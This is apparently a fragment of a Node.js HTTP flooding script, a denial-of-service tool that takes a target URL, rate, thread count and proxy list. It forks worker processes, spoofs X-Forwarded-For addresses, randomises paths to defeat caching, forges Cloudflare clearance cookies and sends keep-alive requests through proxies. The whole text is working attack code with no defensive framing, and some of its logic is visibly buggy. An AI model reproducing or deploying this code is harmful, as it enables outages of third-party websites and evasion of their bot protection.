...
const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`URL time(60) rate(64) thread(2,3,4) proxyfile`); process.exit();}
 const headers = {};
 ...
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 555);
   };
...
const mozilla = [
 ...
 if (cluster.isMaster) {
    for (let counter = 10; counter <= args.threads; counter++) {
        cluster.fork();
    }
...
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(100) + queryString + randomString(100);
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(150);
headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(150);
headers[":authority"] = parsedTarget.host;
...
headers["cookie"] = "cf_clearance=" + randstr(40) + "." + randstr(200) + "." + randstr(40) + "-0.0.1 " + randstr(200) + ";_ga=" + randstr(200) + ";_gid=" + randstr(15)
...
headers["TE"] = "trailers";
headers["cookie"] = "cf_clearance=" + randstr(40) + "." + randstr(200) + "." + randstr(400) + "-0.0.1 " + randstr(200) + ";_ga=" + randstr(200) + ";_gid=" + randstr(150);
...
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(50) + "=" + randstr(150);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = spoofed;
...
headers["x-requested-with"] = "XMLHttpRequest";
 ...
 function runFlooder() {
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         connection.setKeepAlive(true, 2000000);
